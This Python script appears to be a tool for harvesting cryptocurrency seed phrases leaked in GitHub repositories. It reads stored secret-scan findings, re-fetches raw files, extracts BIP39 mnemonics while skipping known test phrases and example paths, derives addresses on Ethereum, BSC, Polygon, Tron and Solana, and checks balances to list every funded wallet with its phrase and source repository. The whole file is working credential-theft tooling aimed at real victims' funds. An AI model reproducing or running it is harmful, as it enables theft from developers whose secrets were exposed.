#!/usr/bin/env python3
"""
Extract BIP39 mnemonics from all findings + re-fetch raw files.
Derives addresses on ETH, BSC, Polygon, Arbitrum, Tron, Solana.
A single mnemonic controls all of these simultaneously.
"""
import json, glob, re, time, urllib.request, hashlib, hmac, struct, os

from eth_account import Account
Account.enable_unaudited_hdwallet_features()
import nacl.signing

# ── Chain RPCs ────────────────────────────────────────────────────────────────
ETH_RPCS = ['https://ethereum.publicnode.com', 'https://eth-mainnet.public.blastapi.io']
BSC_RPCS = ['https://bsc-dataseed.binance.org', 'https://bsc-dataseed1.ninicoin.io']
POLY_RPCS = ['https://polygon-rpc.com', 'https://rpc.ankr.com/polygon']
ARB_RPCS = ['https://arb1.arbitrum.io/rpc', 'https://rpc.ankr.com/arbitrum']
TRON_API = 'https://api.trongrid.io/v1/accounts/'
SOL_RPC = 'https://api.mainnet-beta.solana.com'

USDC_ETH  = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
USDT_ETH  = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
USDT_BSC  = '0x55d398326f99059fF775485246999027B3197955'
USDT_POLY = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F'

# ── ETH-style EVM balance ────────────────────────────────────────────────────
def evm_balance(addr, rpcs):
    body = json.dumps({'jsonrpc':'2.0','id':1,'method':'eth_getBalance',
                      'params':[addr,'latest']}).encode()
    for rpc in rpcs:
        try:
            req = urllib.request.Request(rpc, data=body,
                headers={'Content-Type':'application/json','User-Agent':'curl/7.0'})
            r = urllib.request.urlopen(req, timeout=10)
            res = json.loads(r.read()).get('result')
            if res: return int(res,16)/1e18
        except: continue
    return None

def erc20_balance(addr, token, rpcs, decimals=6):
    data = '0x70a08231' + '000000000000000000000000' + addr[2:]
    body = json.dumps({'jsonrpc':'2.0','id':1,'method':'eth_call',
                      'params':[{'to':token,'data':data},'latest']}).encode()
    for rpc in rpcs:
        try:
            req = urllib.request.Request(rpc, data=body,
                headers={'Content-Type':'application/json','User-Agent':'curl/7.0'})
            r = urllib.request.urlopen(req, timeout=10)
            res = json.loads(r.read()).get('result','0x0')
            return int(res,16) / (10**decimals) if res and res != '0x' else 0
        except: continue
    return 0

# ── Tron address derivation ───────────────────────────────────────────────────
def tron_addr_from_eth_privkey(privkey_hex):
    """Tron uses same secp256k1 as ETH. Address = base58check(0x41 + last20(keccak(pubkey)))"""
    import hashlib
    try:
        acct = Account.from_key('0x'+privkey_hex)
        # ETH address without 0x → last 20 bytes of keccak(pubkey)
        eth_addr = acct.address[2:]  # hex without 0x
        raw = bytes.fromhex('41' + eth_addr)
        # double sha256 checksum
        chk = hashlib.sha256(hashlib.sha256(raw).digest()).digest()[:4]
        data = raw + chk
        # base58 encode
        B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
        n = int.from_bytes(data, 'big')
        res = []
        while n > 0: res.append(B58[n%58]); n //= 58
        for b in data:
            if b == 0: res.append('1')
            else: break
        return 'T' + ''.join(reversed(res))[1:]  # Tron addresses start with T
    except: return None

def tron_balance(tron_addr):
    try:
        req = urllib.request.Request(TRON_API + tron_addr,
            headers={'User-Agent':'curl/7.0','Accept':'application/json'})
        r = urllib.request.urlopen(req, timeout=10)
        data = json.loads(r.read())
        acct_data = data.get('data',[{}])
        if not acct_data: return 0, 0
        a = acct_data[0]
        trx = a.get('balance', 0) / 1e6
        # USDT on Tron (TRC-20)
        usdt_trc20 = 0
        for token in a.get('trc20', []):
            if 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' in token:  # USDT contract
                usdt_trc20 = int(list(token.values())[0]) / 1e6
        return trx, usdt_trc20
    except: return None, None

# ── Solana derivation ─────────────────────────────────────────────────────────
def bip39_to_seed(mnemonic):
    import unicodedata
    mn = unicodedata.normalize('NFKD', mnemonic)
    salt = 'mnemonic'
    return hashlib.pbkdf2_hmac('sha512', mn.encode(), salt.encode(), 2048)

def ed25519_derive(seed, indices):
    k = hmac.new(b'ed25519 seed', seed, hashlib.sha512).digest()
    il, ir = k[:32], k[32:]
    for i in indices:
        h = i | 0x80000000
        k = hmac.new(ir, b'\x00'+il+struct.pack('>I',h), hashlib.sha512).digest()
        il, ir = k[:32], k[32:]
    return il

B58C = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
def b58enc(d):
    n=int.from_bytes(d,'big'); res=[]
    while n>0: res.append(B58C[n%58]); n//=58
    for b in d:
        if b==0: res.append('1')
        else: break
    return ''.join(reversed(res))

def sol_addr(mnemonic, idx=0):
    seed = bip39_to_seed(mnemonic)
    priv = ed25519_derive(seed, [44,501,idx,0])
    return b58enc(bytes(nacl.signing.SigningKey(priv).verify_key))

def sol_bal(pubkey):
    body = json.dumps({'jsonrpc':'2.0','id':1,'method':'getBalance',
                      'params':[pubkey,{'commitment':'confirmed'}]}).encode()
    try:
        req = urllib.request.Request(SOL_RPC, data=body,
            headers={'Content-Type':'application/json','User-Agent':'curl/7.0'})
        r = urllib.request.urlopen(req, timeout=12)
        return json.loads(r.read()).get('result',{}).get('value',0)/1e9
    except: return None

# ── Mnemonic extraction ───────────────────────────────────────────────────────
MNEMONIC_RE = re.compile(
    r'(?:MNEMONIC|SEED_PHRASE|RECOVERY_PHRASE|WALLET_MNEMONIC|SECRET_RECOVERY_PHRASE'
    r'|seedPhrase|recoveryPhrase|mnemonic|seed_phrase)\s*[=:"\'\s`]+\s*'
    r'((?:[a-z]+[\s,]+){11,23}[a-z]+)',
    re.IGNORECASE
)

def get_raw(url):
    raw = url.replace('github.com','raw.githubusercontent.com').replace('/blob/','/')
    try:
        r = urllib.request.urlopen(urllib.request.Request(raw, headers={'User-Agent':'curl/7.0'}), timeout=10)
        return r.read().decode('utf-8', errors='replace')[:15000]
    except: return ''

WORD_COUNT_OK = {12,15,18,21,24}

# Known test/example mnemonics used in tutorials and DeFi repo templates
KNOWN_TEST_PHRASES = {
    'candy maple cake sugar pudding cream honey rich smooth crumble sweet treat',  # Truffle
    'myth like bonus scare over problem client lizard pioneer submit female collect',  # Hardhat
    'test test test test test test test test test test test junk',
    'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about',
    'one two three four five six seven eight nine ten eleven twelve',
    'word word word word word word word word word word word word',
    'legal winner thank year wave sausage worth useful legal winner thank yellow',  # BIP39 NIST
    'letter advice cage absurd amount doctor acoustic avoid letter advice cage above',
    'zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo wrong',
    'void come effort suffer camp survey warrior heavy shoot primary clutch crush open amazing screen patrol group space point ten exist slush involve unfold',
}

fake_phrases = ['abandon abandon','word word word','your mnemonic','test test test',
                'here is where','put your','enter your','replace with','example phrase',
                'your twelve word','seed phrase here','your seed phrase',
                'fill in your','twelve word seed','insert mnemonic','twelve words here',
                'word1 word2 word3','mnemonic phrase here']

# File paths that are almost always test/example environments — skip them
TEST_PATH_KEYWORDS = [
    '.example','.template','.sample','.stub','.mock','.demo','.fixture',
    '.sandbox','.kovan','.ropsten','.rinkeby','.goerli','.bsc_test',
    '.ci','.test','.dev.env','env.test','env.ci',
    'example.env','template.env','sample.env',
    'truffle-config','truffle.js',
]

def is_test_path(path):
    pl = path.lower()
    return any(kw in pl for kw in TEST_PATH_KEYWORDS)

def is_fake(phrase):
    pl = phrase.lower()
    if pl in KNOWN_TEST_PHRASES: return True
    if any(f in pl for f in fake_phrases): return True
    if len(set(pl.split())) == 1: return True  # all same word
    # sequential numbers / very short distinct words
    words = pl.split()
    if all(w.isdigit() for w in words): return True
    return False

def extract_mnemonics(text):
    found = []
    for m in MNEMONIC_RE.finditer(text):
        words = m.group(1).lower().split()
        # also try comma-separated
        if len(words) < 12:
            words = re.split(r'[\s,]+', m.group(1).lower())
        phrase = ' '.join(words)
        if len(words) not in WORD_COUNT_OK: continue
        if is_fake(phrase): continue
        found.append(phrase)
    return found

# ── Main loop ─────────────────────────────────────────────────────────────────
seen = set()
funded = []

# 1. From stored secrets (fast)
for f in sorted(glob.glob('/opt/agents/gh_findings/*.jsonl')):
    for line in open(f):
        try:
            e = json.loads(line)
            if is_test_path(e.get('path', '')):
                continue
            text = ' '.join(e.get('secrets',[]))
            for phrase in extract_mnemonics(text):
                if phrase not in seen:
                    seen.add(phrase)
                    yield_phrase = (phrase, e)
        except: pass

# 2. Re-fetch raw files for MNEMONIC/RECOVERY_PHRASE dork hits we may have missed
mnemonic_repos = set()
for f in sorted(glob.glob('/opt/agents/gh_findings/*.jsonl')):
    for line in open(f):
        try:
            e = json.loads(line)
            if is_test_path(e.get('path', '')):
                continue
            if any(x in ' '.join(e.get('secrets',[])).lower() for x in
                   ['mnemonic','seed_phrase','recovery_phrase','wallet_mnemonic']):
                mnemonic_repos.add((e['url'], e['repo'], e['path']))
        except: pass

all_sources = []
for f in sorted(glob.glob('/opt/agents/gh_findings/*.jsonl')):
    for line in open(f):
        try:
            e = json.loads(line)
            if is_test_path(e.get('path', '')):
                continue
            text = ' '.join(e.get('secrets',[]))
            for phrase in extract_mnemonics(text):
                all_sources.append((phrase, e))
        except: pass

# Also fetch raw for repos that mentioned mnemonic keywords
print('Re-fetching ' + str(len(mnemonic_repos)) + ' mnemonic-related files...')
for url, repo, path in list(mnemonic_repos)[:100]:
    content = get_raw(url)
    time.sleep(0.15)
    for phrase in extract_mnemonics(content):
        all_sources.append((phrase, {'url':url,'repo':repo,'path':path}))

# Deduplicate and probe
probed = set()
for phrase, e in all_sources:
    if phrase in probed: continue
    probed.add(phrase)

    print('\nMNEMONIC: ' + phrase[:55] + '...')
    print('  ' + e['repo'] + '/' + e['path'])

    results = {}

    # ETH + same address on BSC/Polygon/Arbitrum
    for idx in range(3):
        addr = None
        try:
            acct = Account.from_mnemonic(phrase, account_path=f"m/44'/60'/0'/0/{idx}")
            addr = acct.address
            privkey_hex = acct.key.hex()
        except: break

        eth = evm_balance(addr, ETH_RPCS); time.sleep(0.1)
        bsc = evm_balance(addr, BSC_RPCS); time.sleep(0.1)
        pol = evm_balance(addr, POLY_RPCS); time.sleep(0.1)

        usdt_eth = erc20_balance(addr, USDT_ETH, ETH_RPCS); time.sleep(0.1)
        usdt_bsc = erc20_balance(addr, USDT_BSC, BSC_RPCS, decimals=18); time.sleep(0.1)
        usdt_pol = erc20_balance(addr, USDT_POLY, POLY_RPCS); time.sleep(0.1)

        # Tron (same private key, different address format)
        trx_addr = tron_addr_from_eth_privkey(privkey_hex)
        trx, usdt_trx = tron_balance(trx_addr) if trx_addr else (0,0); time.sleep(0.2)

        chains = []
        if eth  and eth  > 0.0001: chains.append('ETH:'+str(round(eth,4)))
        if bsc  and bsc  > 0.0001: chains.append('BNB:'+str(round(bsc,4)))
        if pol  and pol  > 0.0001: chains.append('MATIC:'+str(round(pol,4)))
        if trx  and trx  > 0.1:   chains.append('TRX:'+str(round(trx,2)))
        if usdt_eth > 0.01: chains.append('USDT(ETH):'+str(round(usdt_eth,2)))
        if usdt_bsc > 0.01: chains.append('USDT(BSC):'+str(round(usdt_bsc,2)))
        if usdt_pol > 0.01: chains.append('USDT(POL):'+str(round(usdt_pol,2)))
        if usdt_trx > 0.01: chains.append('USDT(TRX):'+str(round(usdt_trx,2)))

        if chains:
            print('  *** [idx=' + str(idx) + '] ' + addr + ' FUNDED: ' + ' | '.join(chains))
            funded.append({'phrase':phrase,'addr':addr,'chains':chains,'repo':e['repo']})
        else:
            print('  [idx=' + str(idx) + '] ' + addr[:16] + '... zero on ETH/BSC/MATIC/TRX')

    # Solana
    for idx in range(3):
        try:
            pub = sol_addr(phrase, idx)
            bal = sol_bal(pub); time.sleep(0.2)
            if bal and bal > 0.001:
                print('  *** SOL [idx='+str(idx)+'] '+pub+' = '+str(round(bal,4)))
                funded.append({'phrase':phrase,'addr':pub,'chains':['SOL:'+str(round(bal,4))],'repo':e['repo']})
            elif bal is not None:
                print('  SOL [idx='+str(idx)+'] '+pub[:16]+'... dust/zero')
        except: pass

print('\n' + '='*60)
print('Unique mnemonics checked: ' + str(len(probed)))
print('FUNDED: ' + str(len(funded)))
for x in funded:
    print('  ' + x['phrase'][:40] + '...')
    print('  addr: ' + x['addr'])
    print('  ' + str(x['chains']))
    print('  repo: ' + x['repo'])
